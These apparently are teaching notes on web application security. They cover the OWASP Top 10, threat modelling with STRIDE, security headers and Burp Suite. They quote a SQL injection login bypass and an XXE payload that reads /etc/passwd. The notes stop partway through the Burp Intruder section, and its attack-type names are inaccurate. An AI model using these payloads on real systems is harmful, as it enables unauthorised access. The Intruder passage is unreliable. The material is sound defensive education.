# Web Application Security — Session 3 & 4 Notes

### Session 3 (3T+3L) — Theory
Web Application Security Risks · Identifying the Application Security Risks · Threat Risk Modelling · Other HTTP Fields · Overview of Burp Suite Features

### Session 4 (3T+2L) — Theory
Data Extraction · Advanced Identification/Exploitation

---

# SESSION 3

## 1. Web Application Security Risks

Web application security risks are vulnerabilities or weaknesses in a web application that attackers can exploit to compromise confidentiality, integrity, or availability. Because web apps are publicly accessible over the internet and handle complex user inputs and outputs, they present a large and attractive attack surface.

### 1.1 What Are Web Application Security Risks?

**Definition**: Risks arising from design, implementation, configuration, or operational flaws in a web application that allow an attacker to:
- Access or steal sensitive data (confidentiality breach)
- Modify or corrupt data (integrity breach)
- Disrupt or deny service (availability breach)

**Why web apps are uniquely risky**:
- Always online and reachable from anywhere
- Accept untrusted input from users (forms, URLs, APIs, files)
- Often connect to databases, internal services, and third-party components
- Rapid development cycles and frequent changes can introduce new flaws

### 1.2 The OWASP Top 10 — Detailed Breakdown

OWASP (Open Web Application Security Project) maintains the **Top 10** list of the most critical web application security risks, used as a baseline for secure development and testing.

**A01 — Broken Access Control**
- *What it is*: Applications fail to properly enforce restrictions on what authenticated users are allowed to do, enabling unauthorized access to data or functions.
- *Common scenarios*: Accessing another user's data by changing IDs (e.g., `/user/123` → `/user/124`); bypassing access checks by directly calling APIs or admin URLs; missing authorization checks on the server side (only client-side checks); API endpoints returning data for other users.
- *Impact*: Unauthorized data access; privilege escalation (user → admin); unauthorized actions (e.g., fund transfers, transactions).
- *Mitigation*: Enforce access control checks on every request (server-side); use RBAC and least privilege; avoid predictable resource identifiers (use random IDs); log access control failures for monitoring.

**A02 — Cryptographic Failures**
- *What it is*: Sensitive data is exposed due to weak or missing encryption, poor key management, or transmitting data in cleartext (formerly "Sensitive Data Exposure").
- *Common scenarios*: Storing passwords in plaintext or with weak hashing (e.g., MD5); transmitting data over HTTP instead of HTTPS; using outdated TLS versions or weak ciphers; logging sensitive data accidentally.
- *Impact*: Credential theft; exposure of PII/financial data; compliance violations (GDPR, HIPAA, DPDP Act, etc.).
- *Mitigation*: Encrypt sensitive data at rest and in transit; use strong algorithms (AES-256, bcrypt/Argon2 for passwords); enforce HTTPS with HSTS and modern TLS; minimize data storage — never store what you don't need; avoid logging sensitive fields; rotate keys regularly.

**A03 — Injection**
- *What it is*: Untrusted data is sent to an interpreter (e.g., SQL database, OS shell, LDAP server) as part of a command or query, causing unintended execution.
- *Types*: SQL Injection (SQLi) — e.g. `' OR '1'='1` in a login form bypasses authentication; NoSQL Injection (e.g., against MongoDB); OS Command Injection — appends OS commands to inputs executed by the server; LDAP/XML Injection — manipulates queries to directory or XML parsers.
- *Impact*: Full database compromise; data theft or destruction; remote code execution (RCE).
- *Mitigation*: Use parameterized queries/prepared statements; validate and sanitize all inputs (prefer allowlists); escape output where needed; apply least privilege to DB accounts and services.

**A04 — Insecure Design**
- *What it is*: Flaws in architecture or design that can't be fixed by patches alone. Results from missing threat modeling, poor security requirements, or rushed design.
- *Common scenarios*: No rate limiting (brute-force attacks succeed); weak password recovery flows; business logic flaws (e.g., manipulating cart prices).
- *Impact*: Systemic vulnerabilities that enable entire classes of attacks.
- *Mitigation*: Integrate security from the start (Security by Design); perform threat modeling (e.g., STRIDE); use secure design patterns and reference architectures; validate business logic rigorously.

**A05 — Security Misconfiguration**
- *What it is*: Improperly configured servers, frameworks, cloud services, or application settings expose the app to attack.
- *Common scenarios*: Default credentials left unchanged (e.g., admin/admin); unnecessary services, ports, or features enabled; verbose error messages revealing stack traces and paths; unprotected cloud storage buckets (e.g., open S3); missing security headers (CSP, X-Frame-Options).
- *Impact*: Information disclosure; unauthorized access; full system compromise.
- *Mitigation*: Use hardened, minimal configurations; automate configuration checks (IaC + scanning); remove unused features, services, and sample apps; disable detailed errors in production; apply security headers and secure defaults.

**A06 — Vulnerable and Outdated Components**
- *What it is*: Using libraries, frameworks, or other components with known security flaws.
- *Common scenarios*: Outdated JavaScript libraries (e.g., old jQuery with XSS bugs); unpatched server software (e.g., old Apache, Tomcat); dependencies with known CVEs (e.g., Log4Shell).
- *Impact*: Attackers exploit known flaws to compromise the app; supply chain attacks via compromised dependencies.
- *Mitigation*: Maintain a Software Bill of Materials (SBOM); use dependency scanning tools (Snyk, npm audit, OWASP Dependency-Check); patch and update regularly; remove unused dependencies.

**A07 — Identification and Authentication Failures (Broken Authentication)**
- *What it is*: Weaknesses in authentication mechanisms allow attackers to compromise user identities, sessions, or credentials.
- *Common scenarios*: Weak password policies (no complexity, no lockout); credentials transmitted in cleartext (no HTTPS); session IDs exposed in URLs or logs; no multi-factor authentication (MFA); improper session invalidation on logout.
- *Impact*: Account takeover; identity theft; unauthorized actions on behalf of users.
- *Mitigation*: Enforce strong password rules and account lockout after failed attempts; use secure, random session IDs marked `HttpOnly` and `Secure`; implement MFA especially for sensitive operations; invalidate sessions on logout and after timeout; protect against credential stuffing and brute-force attacks.

**A08 — Software and Data Integrity Failures**
- *What it is*: Code and data are assumed trustworthy without verification, enabling supply chain attacks or unauthorized modifications. Includes insecure deserialization.
- *Common scenarios*: Loading libraries from untrusted CDNs; CI/CD pipelines without integrity checks; auto-updating mechanisms without signature verification; deserializing untrusted data (attacker sends a crafted serialized object containing malicious code that executes during deserialization).
- *Impact*: Malicious code injection; compromised updates; data tampering; remote code execution; privilege escalation.
- *Mitigation*: Use code signing and verify signatures; secure CI/CD pipelines (access control, audit logs); use Software Composition Analysis (SCA) tools; avoid auto-updates from untrusted sources; avoid deserializing untrusted data where possible; use safe, language-native formats (e.g., JSON); validate and integrity-check serialized data.

**A09 — Security Logging and Monitoring Failures**
- *What it is*: Insufficient logging, monitoring, or incident response allows attackers to operate undetected.
- *Common scenarios*: No logs for failed logins or access control violations; logs not monitored in real time; logs stored without integrity protection; sensitive data (passwords, tokens) logged accidentally.
- *Impact*: Delayed detection, prolonged breaches, inability to perform forensics.
- *Mitigation*: Log all security-relevant events (auth, access control, input validation failures); protect logs from tampering; use SIEM or alerting tools for real-time monitoring; never log sensitive data.

**A10 — Server-Side Request Forgery (SSRF)**
- *What it is*: The application is tricked into making unintended HTTP requests to internal or external systems.
- *Common scenarios*: Fetching a URL provided by the user without validation; accessing internal APIs or cloud metadata endpoints (e.g., `http://169.254.169.254`).
- *Impact*: Internal network scanning, data exfiltration, remote code execution.
- *Mitigation*: Validate and allowlist all user-supplied URLs; block requests to internal IP ranges; use network segmentation and firewalls; disable unnecessary URL-fetching features.

**XML External Entities (XXE)** *(folded into A05 in the 2021 list, but worth knowing separately)*
- *What it is*: Applications parsing XML input with external entity references enabled, allowing attackers to read internal files, perform SSRF, or cause DoS.
- *How it works*: Attacker sends XML like:
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>
  ```
  If the XML parser resolves external entities, it leaks file contents.
- *Impact*: Disclosure of internal files and configuration; SSRF; denial of service via recursive entity expansion.
- *Mitigation*: Disable external entity processing in XML parsers; use simpler data formats (e.g., JSON) where possible; validate and sanitize XML input; keep XML libraries updated.

**Cross-Site Scripting (XSS)** *(folded into A03 Injection in the 2021 list)*
- *What it is*: Attackers inject malicious scripts into web pages viewed by other users, executing in the victim's browser.
- *Types*: Reflected XSS (payload reflected immediately, e.g. via search query); Stored XSS (payload stored on the server, e.g. in comments, served to other users); DOM-based XSS (payload processed entirely client-side via JavaScript).
- *Impact*: Session hijacking (stealing cookies/tokens); defacement or phishing; keylogging or malware delivery.
- *Mitigation*: Encode output based on context (HTML, JS, URL, CSS); validate and sanitize all user inputs; use Content Security Policy (CSP) headers; use frameworks that auto-escape output (React, Angular).

### 1.3 Additional Common Web App Risks (Beyond the OWASP Top 10)
- **Cross-Site Request Forgery (CSRF)**: forcing a logged-in user to perform unwanted actions.
- **Insecure Direct Object References (IDOR)**: accessing objects by manipulating identifiers.
- **Denial of Service (DoS/DDoS)**: overwhelming the app to make it unavailable.
- **File Upload Vulnerabilities**: allowing malicious files (e.g., web shells) to be uploaded.
- **Session Hijacking/Fixation**: stealing or forcing a user's session ID.

### 1.4 Why Web Application Security Matters
Web applications are prime targets for attackers because of:
- **High accessibility**: available 24/7 from anywhere on the internet.
- **Rich attack surface**: multiple entry points (forms, APIs, file uploads, third-party integrations).
- **Valuable data**: often store credentials, financial data, PII, and business-critical information.
- **Complex ecosystems**: depend on many components (frameworks, libraries, cloud services), each potentially vulnerable.

**Consequences of successful attacks**: data theft (credentials, financial info, PII); data loss or corruption; service disruption or downtime (DoS/DDoS, ransomware); unauthorized control over systems (RCE, admin access); reputational damage and legal/compliance penalties.

### 1.5 Defensive Best Practices
- **Input validation & output encoding**: sanitize all inputs; encode outputs to prevent XSS/injection.
- **Use a Web Application Firewall (WAF)**: block common attack patterns.
- **Secure Development Lifecycle (SDL)**: integrate security into design, coding, testing, and deployment.
- **Regular penetration testing**: actively test for vulnerabilities.
- **Keep everything updated**: patch frameworks, libraries, and servers promptly.
- **Principle of Least Privilege**: restrict permissions for users, services, and DB accounts.
- **Automated testing**: SAST, DAST, dependency scanning.
- **Robust logging, monitoring, and incident response.**

---

## 2. Identifying the Application Security Risks

Identifying application security risks means systematically discovering weaknesses in an application before attackers do. This involves a mix of design-level analysis, code inspection, runtime testing, and real-world attack simulation.

### 2.1 Techniques for Risk Identification

**Code Review**
- *What it is*: Manual or automated inspection of source code to find security flaws, logic errors, and unsafe patterns.
- *Manual code review*: Security-conscious developers or reviewers read code to spot issues like hardcoded credentials, missing input validation, improper error handling, insecure cryptographic usage.
- *Automated code review*: Tools scan code for known insecure patterns (e.g., use of `eval()`, unsafe string functions).
- *When to use*: During development and before major releases.
- *Strengths*: Finds deep logical issues; spreads security knowledge in the team; can catch context-aware issues tools miss.
- *Limitations*: Time-consuming for large codebases; depends on reviewer expertise; easy to miss issues without a structured checklist.
- *Best practices*: Use a security-focused checklist (e.g., OWASP Secure Coding Practices); focus on high-risk areas (auth, access control, input handling, crypto, session management); combine with automated tools for better coverage.

**Static Application Security Testing (SAST)**
- *What it is*: Automated tools analyze source code (or bytecode/binaries) without executing the application to detect potential vulnerabilities.
- *How it works*: Parses code and builds an abstract syntax tree (AST); applies rules/patterns to detect insecure constructs (e.g., SQL string concatenation, weak crypto); produces a report of potential issues with line numbers.
- *Examples of issues found*: SQL injection patterns, hardcoded secrets, use of deprecated/insecure APIs, missing input validation.
- *When to use*: Early in the development lifecycle (CI/CD pipeline, pre-commit, pull requests).
- *Strengths*: Finds issues before code runs; scales well for large codebases; integrates into IDEs and CI for continuous feedback.
- *Limitations*: Can produce false positives; may miss issues that depend on runtime behavior or configuration; limited visibility into business logic flaws.
- *Best practices*: Tune rules to reduce noise; treat SAST as a helper, not a replacement for human review; fix high-severity findings first and triage regularly.

**Dynamic Application Security Testing (DAST)**
- *What it is*: Testing a running application (usually via HTTP/HTTPS) to find runtime vulnerabilities by simulating attacks.
- *How it works*: The DAST tool acts like an attacker, sending malformed/special inputs to forms, URLs/parameters, APIs, headers, cookies, etc., and observes responses for signs of vulnerabilities.
- *Examples of issues found*: SQL injection (via DB errors or behavior changes); XSS (by injecting scripts and checking execution); broken access control (trying to access other users' resources); security misconfigurations (missing headers, verbose errors).
- *When to use*: On staging or test environments that closely mirror production.
- *Strengths*: Finds runtime issues SAST may miss; technology-agnostic; good for testing deployed applications.
- *Limitations*: Cannot see internal code, limited to observable behavior; might miss issues requiring authenticated/internal access unless configured properly; can be noisy and potentially disruptive.
- *Best practices*: Run against non-production environments; configure authentication and user roles for deeper testing; combine with SAST for broader coverage.

**Penetration Testing**
- *What it is*: Simulated real-world attacks performed by security professionals (internal or external) to identify exploitable security flaws.
- *Approach*: Reconnaissance → threat modeling → exploitation → post-exploitation → reporting.
- *Types*: Black-box (no prior knowledge), Gray-box (partial knowledge), White-box (full knowledge, architecture, code access).
- *When to use*: Periodically (e.g., annually), after major changes, or before critical launches.
- *Strengths*: Realistic view of attacker behavior; finds complex, chained vulnerabilities; provides prioritized, actionable remediation guidance.
- *Limitations*: Point-in-time assessment; can be expensive and time-consuming; quality depends heavily on tester skill.
- *Best practices*: Define clear scope and rules of engagement; include both internal and external perspectives; re-test after fixes to validate remediation.

**Threat Modeling**
- *What it is*: A structured process to identify, quantify, and address security risks during the design and architecture phase. (Covered in detail in the next section.)

### 2.2 Common Indicators of Security Risks

Even without formal tools, certain signs can suggest underlying security problems.

**Unexpected Application Behavior**
- Examples: users can access other users' data by changing IDs in URLs; special characters cause odd page behavior or errors; non-admin accounts can perform admin-only actions.
- Why it matters: often points to broken access control, input validation issues, or logic flaws in business rules.

**Unusual Logs or Errors**
- Examples: repeated failed login attempts from the same IP (brute-force); database errors showing SQL syntax in logs (possible injection attempts); stack traces or internal paths exposed in error pages.
- Why it matters: may indicate active attacks/scanning, insufficient error handling, or information leakage that helps attackers.

**Inputs Accepted Without Validation**
- Examples: forms accepting extremely long strings without limits; API endpoints accepting unexpected data types or formats; no validation on file uploads (any extension, any size).
- Why it matters: leads to injection attacks, buffer overflows/DoS via large inputs, or malicious file uploads (web shells, malware).

**Unprotected Sensitive Data Flows**
- Examples: login pages served over HTTP instead of HTTPS; sensitive data (passwords, tokens, PII) visible in URLs, client-side code, or logs; internal APIs exposed without authentication.
- Why it matters: results in credential theft via network sniffing, session hijacking, and data breaches/compliance violations.

### 2.3 Putting It All Together: A Practical Approach

- **Design phase**: perform threat modeling to identify architectural risks.
- **Development phase**: conduct code reviews (manual + automated); integrate SAST into CI/CD.
- **Testing phase**: run DAST against staging environments; perform targeted penetration tests.
- **Operations phase**: monitor logs and behavior for indicators of risk; periodically re-run tests and update threat models.

---

## 3. Threat Risk Modelling

Threat modelling is a structured process used to identify, quantify, and address security threats and risks in an application or system. It helps teams prioritize mitigation efforts based on the impact and likelihood of each risk, ensuring that security controls are applied where they matter most.

### 3.1 What Is Threat Modeling?

**Definition**: A systematic approach to identify potential threats and vulnerabilities in a system, understand how attackers might exploit them, assess the associated risks (impact and likelihood), and define and prioritize mitigation strategies.

**Goals**:
- Discover security issues early (ideally during design)
- Align security work with business priorities
- Make informed decisions about where to invest time and resources
- Create a shared understanding of risks among developers, architects, and security teams

**When to do it**: during initial system/application design; when adding major new features or changing architecture; after significant incidents or new threat intelligence; periodically as part of a secure development lifecycle.

### 3.2 Steps in Threat Modeling

**Step 1: Identify Assets**
- *Question*: What needs protection?
- *Data assets*: user credentials (passwords, tokens); personal data (names, emails, IDs, addresses); financial data (card numbers, transaction history); business-critical data (configs, intellectual property).
- *User assets*: end users, admins, service accounts.
- *System assets*: web servers, app servers, databases; APIs, microservices; third-party integrations; cloud resources (storage buckets, VMs, containers).
- Why it matters: knowing what you're protecting helps focus the threat analysis on what truly matters.

**Step 2: Create an Architecture Overview**
- *Question*: How does the system work, and where are the trust boundaries?
- *Activities*: draw a high-level architecture diagram (components, external systems, network zones); create Data Flow Diagrams (DFDs) showing how data moves and where it's stored/processed/transmitted; identify trust boundaries — points where data moves from less trusted to more trusted zones (e.g., user → web app, web app → DB), where security controls are most critical.
- *Example DFD elements*: external entities (users, external services), processes (web server, auth service), data stores (DB, file storage), data flows (arrows showing direction).
- Why it matters: a clear architecture and data flow view makes it easier to spot where attacks can happen and where controls are needed.

**Step 3: Identify Threats — the STRIDE Model**

STRIDE is a widely used mnemonic covering six primary threat types:

1. **Spoofing** — attacker pretends to be someone else. *Examples*: stealing credentials to log in as another user; forging API requests with another user's token. *Typical targets*: authentication mechanisms, session management.
2. **Tampering** — attacker modifies data or code maliciously. *Examples*: changing order amounts in a shopping cart; modifying configuration files or logs; altering in-transit data (MITM). *Typical targets*: input fields, config files, network traffic.
3. **Repudiation** — users or attackers deny having performed an action, with no proof. *Examples*: an admin performs a risky action with no logs recording who did it; a user denies making a transaction with no audit trail. *Typical targets*: logging, audit mechanisms.
4. **Information Disclosure** — attacker gains access to data they shouldn't see. *Examples*: leaking PII via insecure APIs; exposing stack traces or DB schema in error messages; unencrypted data in transit or at rest. *Typical targets*: data stores, logs, error messages, network channels.
5. **Denial of Service (DoS)** — attacker disrupts service availability. *Examples*: flooding an API with requests to exhaust resources; sending huge payloads to cause memory exhaustion. *Typical targets*: network, application logic, resource limits.
6. **Elevation of Privilege** — attacker gains higher permissions than intended. *Examples*: a regular user accessing admin functions; exploiting a bug to run code as root/admin. *Typical targets*: access control checks, privilege separation.

**How to apply STRIDE**: for each component and data flow in your DFD, ask: can this be spoofed? Can data here be tampered with? Can actions here be repudiated? Can sensitive info be disclosed? Can this be used for DoS? Can privilege be elevated here?

**Step 4: Assess Risks**
- *Question*: Which threats matter most?
- For each identified threat, estimate:
  1. **Impact (Severity)**: what would happen if this threat were realized? (Data breach? Financial loss? Downtime? Reputational damage?) Scale: Low/Medium/High.
  2. **Likelihood (Probability)**: how likely is this threat to be exploited? Depends on exposure (internet-facing vs. internal), complexity of attack, existing controls. Scale: Low/Medium/High.
- *Simple risk scoring*: Risk = Impact × Likelihood (e.g., High × High = Critical risk).
- Can also use **DREAD**: Damage potential, Reproducibility, Exploitability, Affected users, Discoverability — each rated, then averaged/summed to prioritize.
- *Output*: a prioritized list of threats, e.g. Critical: SQL injection on login (High impact, High likelihood); High: missing rate limiting on password reset; Medium: verbose error messages.

**Step 5: Define Mitigation Strategies**
- *Question*: What will we do about each risk?
- *Design changes*: remove risky features/flows; introduce clear trust boundaries; enforce least privilege in architecture.
- *Security controls*: authentication and authorization mechanisms; input validation and output encoding; encryption (in transit and at rest); rate limiting, throttling, WAF rules.
- *Operational measures*: logging and monitoring for suspicious activity; alerting on anomalies (failed logins, unusual access patterns); regular patching and updates.
- *Accept, transfer, or avoid risk*: **Accept** (risk is low, mitigation cost is high); **Transfer** (use insurance or third-party services); **Avoid** (remove the feature causing the risk).
- *Documenting mitigations*: for each threat, record the chosen mitigation, owner, timeline, and residual risk after mitigation.

### 3.3 Example: Simple Threat Modeling Walkthrough

**Scenario**: A basic web app with users logging in over the internet, Web server → App server → Database, and an admin panel for managing users.

- **Step 1 (Assets)**: user credentials, user profile data, admin functions, database.
- **Step 2 (Architecture)**: external entity — user (browser); components — web server, app server, DB; trust boundaries — Internet ↔ Web server, Web server ↔ App server, App server ↔ DB.
- **Step 3 (Threats via STRIDE)**: Spoofing — attacker steals session cookie to impersonate user; Tampering — attacker modifies request parameters to change order amount; Information disclosure — DB errors exposed in browser reveal schema; Elevation of privilege — regular user accesses `/admin` URL directly; DoS — attacker floods login endpoint to exhaust resources; Repudiation — admin actions not logged, cannot prove who did what.
- **Step 4 (Risk assessment)**: Session hijacking (Spoofing) — High impact, Medium–High likelihood → High risk; Unauthorized admin access (Elevation of privilege) — High impact, Medium likelihood → High risk; DB error leakage (Information disclosure) — Medium impact, Medium likelihood → Medium risk.
- **Step 5 (Mitigations)**: use secure, HttpOnly, Secure cookies with session timeout/regeneration; enforce server-side access control checks on all admin endpoints with RBAC; disable detailed error messages in production and log errors internally; add rate limiting on login endpoints; log all admin actions with user ID and timestamp.

### 3.4 Benefits of Threat Modeling
- **Early detection**: finds issues before code is written or widely deployed.
- **Prioritization**: focuses effort on the most serious risks.
- **Shared understanding**: aligns developers, architects, and security.
- **Cost-effective**: cheaper to fix design issues early than after deployment.
- **Compliance support**: helps meet security requirements in standards and audits.

---

## 4. Other HTTP Fields

HTTP headers are key–value pairs sent in every HTTP request and response. They carry metadata that influences how browsers and servers behave, including important security-related behavior. Properly configured security headers can significantly reduce the risk of common web attacks like XSS, clickjacking, and man-in-the-middle (MITM) attacks.

### 4.1 Understanding HTTP Request and Response Headers

**HTTP Request Headers** (client → server) tell the server about the client's capabilities and preferences:
- `Host`: domain being accessed
- `User-Agent`: browser/OS info
- `Accept`: content types the client can handle
- `Authorization`: credentials (e.g., Bearer token)
- `Cookie`: session cookies sent to the server

**HTTP Response Headers** (server → client) tell the client how to handle the response and add security controls:
- `Content-Type`: type of content (e.g., `text/html`, `application/json`)
- `Set-Cookie`: sets cookies on the client
- `Location`: redirect URL
- Security headers like `Content-Security-Policy`, `Strict-Transport-Security`, etc.

### 4.2 Important Security-Related HTTP Headers

**Content-Security-Policy (CSP)**
- *Purpose*: controls which resources (scripts, styles, images, etc.) the browser is allowed to load and execute, helping mitigate XSS and data injection attacks.
- *How it works*: the server sends a policy defining trusted sources; the browser enforces this policy and blocks anything not allowed.
- Example:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src 'self' data:;
  ```
- *Key directives*: `default-src` (default policy for all resource types unless overridden); `script-src` (allowed JS sources); `style-src` (allowed CSS sources); `img-src` (allowed image sources); `frame-ancestors` (who can embed this page, replaces `X-Frame-Options`); `object-src`, `media-src`, `font-src`, etc.
- *Security benefits*: blocks inline scripts by default (unless explicitly allowed with `'unsafe-inline'`); prevents loading scripts/styles from untrusted domains; mitigates XSS, clickjacking, and some data exfiltration.
- *Best practices*: start with a strict policy (`default-src 'self'`); avoid `'unsafe-inline'` and `'unsafe-eval'`; use CSP reporting (`report-uri`/`report-to`) to monitor violations; test thoroughly to avoid breaking legitimate functionality.

**Strict-Transport-Security (HSTS)**
- *Purpose*: forces browsers to use HTTPS for all future connections to the domain, preventing downgrade attacks and MITM over HTTP.
- *How it works*: once a browser receives this header over HTTPS, it remembers to only use HTTPS for a specified duration.
- Example:
  ```http
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```
- *Directives*: `max-age` (time in seconds to remember to use HTTPS); `includeSubDomains` (applies to all subdomains); `preload` (include the domain in browser HSTS preload lists).
- *Security benefits*: prevents protocol downgrade attacks; blocks MITM on initial HTTP requests; ensures encrypted communication even if the user types `http://`.
- *Best practices*: deploy only on fully HTTPS sites; start with a short `max-age` and increase gradually; use `includeSubDomains` carefully; consider submitting to HSTS preload lists.

**X-Frame-Options**
- *Purpose*: prevents clickjacking by controlling whether a page can be embedded in `<frame>`, `<iframe>`, `<embed>`, or `<object>` elements.
- Example: `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`
- *Directives*: `DENY` (cannot be framed by any site); `SAMEORIGIN` (only framed by pages from the same origin); `ALLOW-FROM uri` (deprecated).
- *Security benefits*: prevents attackers from embedding your site in a hidden iframe to trick users into clicking (clickjacking); protects sensitive actions (e.g., "Delete account," "Transfer funds") from being hijacked.
- *Best practices*: use `DENY` unless framing is explicitly required; complement/replace with CSP `frame-ancestors` for modern browsers; include on all pages with sensitive actions.

**X-Content-Type-Options**
- *Purpose*: prevents browsers from "MIME-sniffing" (guessing the content type) and forces them to respect the declared `Content-Type`, reducing XSS risk via malicious file uploads or misinterpreted content.
- Example: `X-Content-Type-Options: nosniff`
- *How it helps*: without this header, a browser might treat a file uploaded as `image/jpeg` but containing HTML/JS as executable content; with `nosniff`, the browser strictly follows `Content-Type`.
- *Security benefits*: reduces risk of XSS via uploaded files or mislabeled content; prevents certain drive-by download and content-type confusion attacks.
- *Best practices*: set on all responses; ensure correct `Content-Type` headers are set for all resources; particularly important for file upload/download endpoints.

**Set-Cookie (with Security Attributes)**
- *Purpose*: tells the browser to store a cookie; its attributes control how the cookie is sent and accessed, directly affecting session security.
- Example:
  ```http
  Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
  ```
- *Key attributes*:
  - `HttpOnly`: prevents JavaScript from accessing the cookie (`document.cookie`); mitigates session hijacking via XSS.
  - `Secure`: cookie is sent only over HTTPS; prevents exposure over insecure networks.
  - `SameSite`: controls when cookies are sent with cross-site requests — `Strict` (same-site only), `Lax` (allows some cross-site requests like top-level navigations), `None` (sent with all requests, must also set `Secure`); helps mitigate CSRF.
  - `Path`: limits the cookie to a specific path on the domain.
  - `Domain`: specifies which domains can receive the cookie.
  - `Max-Age` / `Expires`: controls cookie lifetime; shorter lifetimes reduce risk.
- *Best practices*: always set `Secure` on production HTTPS sites; use `HttpOnly` for session/auth cookies; prefer `SameSite=Strict` or `Lax` unless cross-site usage is required; avoid long-lived session cookies, use refresh tokens where appropriate.

**Cache-Control**
- *Purpose*: controls how and where responses can be cached (browsers, proxies, CDNs). Misconfigured caching can leak sensitive data via shared caches or browser history.
- Example: `Cache-Control: no-store, no-cache, must-revalidate, private`
- *Common directives*: `no-store` (don't store the response anywhere — use for highly sensitive data); `no-cache` (cache allowed, but must revalidate); `must-revalidate` (once stale, must not be used without revalidation); `private` (cached only by the user's browser, not shared caches/proxies); `public` (cacheable by any cache); `max-age` (freshness duration in seconds).
- *Best practices*: use `no-store` or `private, no-cache` for authenticated/sensitive pages; be careful with `public` caching on pages showing user-specific data; explicitly set cache headers for API responses containing sensitive info.

### 4.3 Other Notable Security-Related Headers

**X-XSS-Protection (Legacy)**
- Enabled built-in XSS filters in older versions of IE, Chrome, and Safari.
- Example: `X-XSS-Protection: 1; mode=block`
- Modes: `0` (disable), `1` (enable, sanitize page if XSS detected), `1; mode=block` (prevent rendering entirely).
- *Current status*: deprecated in modern browsers; can sometimes introduce XSS vulnerabilities in otherwise safe sites. CSP is the preferred modern mechanism.

**Referrer-Policy**
- Controls how much referrer information is sent when navigating away from your site.
- Example: `Referrer-Policy: strict-origin-when-cross-origin`
- Common values: `no-referrer`; `no-referrer-when-downgrade`; `origin`; `strict-origin-when-cross-origin` (full referrer for same-origin, only origin for cross-origin HTTPS→HTTPS, nothing for HTTPS→HTTP).
- *Security benefits*: reduces leakage of sensitive URLs (e.g., containing tokens or user IDs); limits information available to third-party sites.

**Permissions-Policy (formerly Feature-Policy)**
- Controls which browser features (camera, microphone, geolocation, payment) can be used by the page or embedded frames.
- Example: `Permissions-Policy: camera=(), microphone=(), geolocation=(self)`
- *Security benefits*: reduces attack surface by disabling unnecessary features; helps contain damage if the page is compromised.

**Headers That Leak Information (To Avoid or Restrict)**
- `Server`: e.g. `Server: Apache/2.4.41 (Ubuntu)`
- `X-Powered-By`: e.g. `X-Powered-By: PHP/7.4.3`
- `X-AspNet-Version`: reveals ASP.NET version
- *Best practice*: remove or generalize these headers in production to avoid giving attackers easy fingerprinting information.

### 4.4 A Secure Header Baseline

For a typical secure web application, a good baseline might include:
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
Cache-Control: no-store, no-cache, must-revalidate, private
Set-Cookie: sessionId=...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```
Not every header fits every application, but this set covers the main risks: XSS, clickjacking, MITM, data leakage, and session hijacking.

---

## 5. Overview of Burp Suite Features

Burp Suite is a widely used, integrated platform for web application security testing. It provides a complete set of tools for intercepting, analyzing, modifying, and attacking HTTP/HTTPS traffic, making it a standard choice for penetration testers and security researchers.

### 5.1 What Is Burp Suite?

**Definition**: A comprehensive toolkit designed to help security professionals test the security of web applications. It acts as a man-in-the-middle (MITM) proxy between the browser and the target server, allowing testers to inspect and manipulate all HTTP/HTTPS traffic.

**Primary users**: penetration testers, security researchers, bug bounty hunters, developers performing security testing.

**Editions**:
- **Community Edition**: free; includes core manual testing tools (Proxy, Repeater, Intruder with limited features, Decoder, Comparer, etc.).
- **Professional Edition**: paid; adds automated scanning (Scanner), advanced Intruder options, Collaborator for out-of-band testing, and more.

**Platforms**: Windows, Linux, macOS (Java-based).

### 5.2 Key Features

**Proxy**
- *Purpose*: intercepts, inspects, and modifies HTTP/HTTPS traffic between your browser and the target web application.
- *How it works*: configure your browser to use Burp as a proxy (typically `127.0.0.1:8080`); all requests/responses pass through Burp; you can pause and modify requests/responses before they reach their destination, and view full raw HTTP messages.
- *Main components*: Proxy → Intercept (turn interception on/off, define rules); Proxy → HTTP history (logs all requests/responses); Proxy → WebSocket history (for WebSocket traffic).
- *Use cases*: test input validation by modifying parameters; bypass client-side restrictions (hidden fields, disabled buttons); inspect authentication flows and session tokens; identify hidden parameters, APIs, or endpoints.
- *Security relevance*: core tool for manual testing of almost all web vulnerabilities (injection, access control, auth flaws, etc.).

**Spider (Crawler)**
- *Purpose*: automatically crawls the web application to map its structure and discover pages, parameters, and links.
- *How it works*: starts from a given URL, follows links, submits forms (in active mode), and records discovered URLs, parameters, forms, and APIs.
- *Modes*: Passive spider (follows links and parses existing content, no form submission); Active spider (can submit forms and interact more aggressively).
- *Use cases*: quickly understand the scope/structure of an application; discover hidden or less obvious pages and parameters; build a target list for further testing (e.g., with Intruder or Scanner).
- *Note*: in newer Burp versions, traditional "Spider" functionality is integrated into the **Crawler** and **Target** tab.

**Scanner (Pro Version)**
- *Purpose*: automated vulnerability scanner that actively tests the application for common security issues.
- *What it detects*: SQL injection; XSS (reflected, stored, DOM-based); command injection; path traversal; file inclusion; some authentication and access control issues; misconfigurations and information disclosure.
- *Types of scans*: Active scan (sends crafted payloads and analyzes responses — can affect the app, use on test environments); Passive scan (analyzes traffic without additional payloads — safe for production).
- *Output*: list of issues with severity (High/Medium/Low/Information), description, evidence (request/response snippets), and remediation guidance.
- *Use cases*: rapidly identify common vulnerabilities; complement manual testing; provide a baseline report for developers.
- *Limitations*: may miss complex logic flaws or chained vulnerabilities; can generate false positives/negatives; active scans can be noisy and potentially disruptive.

**Intruder**
- *Purpose*: automates customized attacks, such as brute forcing, fuzzing, and parameter enumeration.
- *How it works*: you define a base request, payload positions (marked with `§`, e.g. `username=§admin§`), and payload lists (wordlists, custom lists, generated patterns); Intruder sends many variations of the request and records responses.
- *Attack types*: **Single** (one payload list, one/multiple positions); **Simple multi** (multiple payload lists, each position gets its own list); **Cluster bomb** (multiple payload lists, all combinations tried — Cartesian product); **Pivot/custom** (advanced or scripted variations).
